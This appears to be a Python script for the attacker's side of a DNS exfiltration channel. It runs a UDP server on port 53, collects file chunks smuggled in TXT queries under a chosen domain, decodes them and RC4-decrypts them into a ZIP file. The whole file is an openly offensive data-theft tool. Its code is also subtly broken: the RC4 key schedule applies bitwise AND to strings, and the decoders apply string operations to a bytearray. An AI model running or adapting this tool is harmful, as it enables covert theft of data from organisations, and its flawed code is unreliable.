#!/usr/bin/python3
# -*- coding: utf-8 -*-
import argparse
import socket
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, TXT
from base64 import b64decode, b32decode
import sys

#======================================================================================================
#                                           HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# Class providing RC4 encryption/decryption functions
#------------------------------------------------------------------------
class RC4:
    def __init__(self, key=None):
        self.state = list(range(256))  # initialization of the permutation table
        self.x = self.y = 0  # the indices x and y, instead of i and j

        if key is not None:
            self.key = key
            self.init(key)

    # Key schedule
    def init(self, key):
        for i in range(256):
            self.x = (str(key[i % len(key)]) + str(self.state[i]) + str(self.x)) & str(0xFF)
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    # Decrypt binary input data
    def binaryDecrypt(self, data):
        output = [None]*len(data)
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)

#------------------------------------------------------------------------
def progress(count, total, status=''):
    """
    Print a progress bar - https://gist.github.com/vladignatyev/06860ec2040cb497f0f3
    """
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write('[{}] {}% {}\t\r'.format(bar, percents, status))
    sys.stdout.flush()

#------------------------------------------------------------------------
def fromBase64URL(msg):
    msg = msg.replace('_','/').replace('-','+')
    if len(msg) % 4 == 3:
        return b64decode(msg + '=')
    elif len(msg) % 4 == 2:
        return b64decode(msg + '==')
    else:
        return b64decode(msg)

#------------------------------------------------------------------------
def fromBase32(msg):
    # Base32 decoding, we need to add the padding back
    # Add padding characters
    mod = len(msg) % 8
    padding = "=" * (-len(msg) % 8)  # Pad with '=' to make the length a multiple of 8
    return b32decode(msg.upper() + padding)

#------------------------------------------------------------------------
def color(string, color=None):
    """
    Change text color for the Linux terminal.
    """
    
    attr = ['1']  # bold
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[{}m{}\x1b[0m'.format(';'.join(attr), string)
    else:
        if string.strip().startswith("[!]"):
            return '\x1b[1;31m{}\x1b[0m'.format(string)  # bold and red
        elif string.strip().startswith("[+]"):
            return '\x1b[1;32m{}\x1b[0m'.format(string)  # bold and green
        elif string.strip().startswith("[?]"):
            return '\x1b[1;33m{}\x1b[0m'.format(string)  # bold and yellow
        elif string.strip().startswith("[*]"):
            return '\x1b[1;34m{}\x1b[0m'.format(string)  # bold and blue
        else:
            return string

#======================================================================================================
#                                           MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':

    #------------------------------------------------------------------------
    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
    parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
    args = parser.parse_args()

    # Setup a UDP server listening on port UDP 53
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))
    print(color("[*] DNS server listening on port 53"))

    try:
        useBase32 = False
        chunkIndex = 0
        fileData = bytearray()

        while True:
            data, addr = udps.recvfrom(1024)
            request = DNSRecord.parse(data)

            if request.q.qtype == 16:
                qname = str(request.q.qname)

                #-----------------------------------------------------------------------------
                # Check if it is the initialization request
                if qname.upper().startswith("INIT."):
                    msgParts = qname.split(".")
                    
                    msg = fromBase32(msgParts[1]).decode('utf-8')
                    fileName, nbChunks = msg.split('|')  # Name of the file and number of chunks
                    nbChunks = int(nbChunks)  # Convert string to int

                    if msgParts[2].upper() == "BASE32":
                        useBase32 = True
                        print(color("[+] Data was encoded using Base32"))
                    else:
                        print(color("[+] Data was encoded using Base64URL"))

                    # Reset all variables
                    fileData = bytearray()
                    chunkIndex = 0

                    print(color(f"[+] Receiving file [{fileName}] as a ZIP file in [{nbChunks}] chunks"))

                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
                    udps.sendto(reply.pack(), addr)

                #-----------------------------------------------------------------------------
                # Else, start receiving the file, chunk by chunk
                else:
                    msg = qname[0:-(len(args.domainName) + 2)]  # Remove the top level domain name
                    chunkNumber, rawData = msg.split('.', 1)

                    #---- Is this the chunk of data we're expecting?
                    if int(chunkNumber) == chunkIndex:
                        fileData += rawData.replace('.', '').encode()
                        chunkIndex += 1
                        progress(chunkIndex, nbChunks, "Receiving file")

                    #---- Always acknowledge the received chunk (whether or not it was already received)
                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
                    udps.sendto(reply.pack(), addr)

                    #---- Have we received all chunks of data?
                    if chunkIndex == nbChunks:
                        print('\n')
                        try:
                            # Create and initialize the RC4 decryptor object
                            rc4Decryptor = RC4(args.password)
                            
                            # Save data to a file
                            outputFileName = fileName + ".zip"
                            print(color(f"[+] Decrypting using password [{args.password}] and saving to output file [{outputFileName}]"))
                            with open(outputFileName, 'wb') as fileHandle:
                                if useBase32:
                                    fileHandle.write(rc4Decryptor.binaryDecrypt(fromBase32(fileData)))
                                else:
                                    fileHandle.write(rc4Decryptor.binaryDecrypt(fromBase64URL(fileData)))
                                print(color(f"[+] Output file [{outputFileName}] saved successfully"))
                        except IOError as e:
                            print(color(f"[!] Could not write file [{outputFileName}]: {e}"))

    except KeyboardInterrupt:
        pass
    finally:
        print(color("[!] Stopping DNS Server"))
        udps.close()
